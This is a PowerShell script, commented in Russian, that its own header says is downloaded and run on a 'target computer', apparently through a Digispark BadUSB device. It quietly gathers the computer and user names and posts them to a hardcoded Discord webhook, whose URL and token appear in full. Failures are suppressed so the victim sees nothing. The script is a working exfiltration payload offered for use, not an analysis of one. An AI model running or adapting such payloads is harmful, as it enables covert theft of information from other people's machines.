# webhook_reporter.ps1
# Этот скрипт будет скачан и выполнен на целевом компьютере.

# !!! ЗАМЕНИТЕ ЭТОТ URL НА ВАШ РЕАЛЬНЫЙ DISCORD WEBHOOK URL !!!
# Например: 'https://discord.com/api/webhooks/123456789012345678/aBcDeFgHiJkLmNoPqRsTuVwXyZ'
$webhookUrl = 'https://discord.com/api/webhooks/1382033925676994591/fD2Tkr-ggL7QXrjiGs3phMu80IyTcQOPGUBstF4-vmDRVa9prGbeISQFqAGrnFmuq72a'

# Собираем информацию о системе
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME

# Формируем JSON-полезную нагрузку для Discord Webhook
$payload = @{
    username = "Digispark Reporter"
    content = "Новый отчет с Digispark!"
    embeds = @(
        @{
            title = "Информация о хосте"
            color = 65280 # Зеленый цвет в десятичном формате
            fields = @(
                @{name = "Имя компьютера"; value = $computerName; inline = $true},
                @{name = "Имя пользователя"; value = $userName; inline = $true}
            )
        }
    )
}

# Преобразуем объект PowerShell в JSON
$jsonPayload = ConvertTo-Json -InputObject $payload -Depth 4 # Depth 4 для корректного вложения

# Отправляем HTTP POST-запрос на вебхук Discord
try {
    Invoke-WebRequest -Uri $webhookUrl -Method POST -ContentType 'application/json' -Body $jsonPayload -TimeoutSec 10 -ErrorAction Stop
}
catch {
    # Здесь можно добавить логирование ошибки, если нужно.
    # Например: Add-Content -Path "$env:TEMP\digispark_error.log" -Value "Ошибка отправки: $($_.Exception.Message)"
}

# (Опционально) Закрыть окно PowerShell после выполнения скрипта
# Если PowerShell запущен с -NoE, он останется открытым.
# Если вы хотите, чтобы окно закрылось, можно добавить:
# exit
